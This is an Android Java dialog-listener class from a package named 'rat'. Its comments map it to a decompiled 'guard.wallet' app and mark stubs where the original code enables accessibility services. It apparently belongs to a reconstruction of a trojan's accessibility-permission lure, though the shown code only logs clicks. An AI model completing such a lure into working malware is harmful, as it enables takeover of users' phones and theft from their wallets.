package com.vendor.rat.helper;

import android.content.DialogInterface;
import android.util.Log;

/**
 * Vendor: com.guard.wallet.helper.j
 * OnClickListener for dialog buttons with multiple modes.
 * mode 0: positive button - triggers accessibility enable
 * mode 1: neutral button - dismisses dialog
 * mode 2: negative button - dismisses and resumes
 */
public final class DialogClickListener implements DialogInterface.OnClickListener {

    public final int mode;

    public DialogClickListener(int mode) {
        this.mode = mode;
    }

    @Override
    public final void onClick(DialogInterface dialogInterface, int which) {
        switch (this.mode) {
            case 0:
                // ADAPT: vendor calls utils.g.n1() to enable accessibility
                Log.d("DialogClickListener", "PositiveButton click - enable accessibility");
                return;
            case 1:
                Log.d("AccessibilityUtils", "NeutralButton click");
                // ADAPT: vendor dismisses utils.b dialog
                return;
            default:
                // ADAPT: vendor dismisses dialog and calls utils.g.V0()
                Log.d("DialogClickListener", "NegativeButton click");
                return;
        }
    }
}
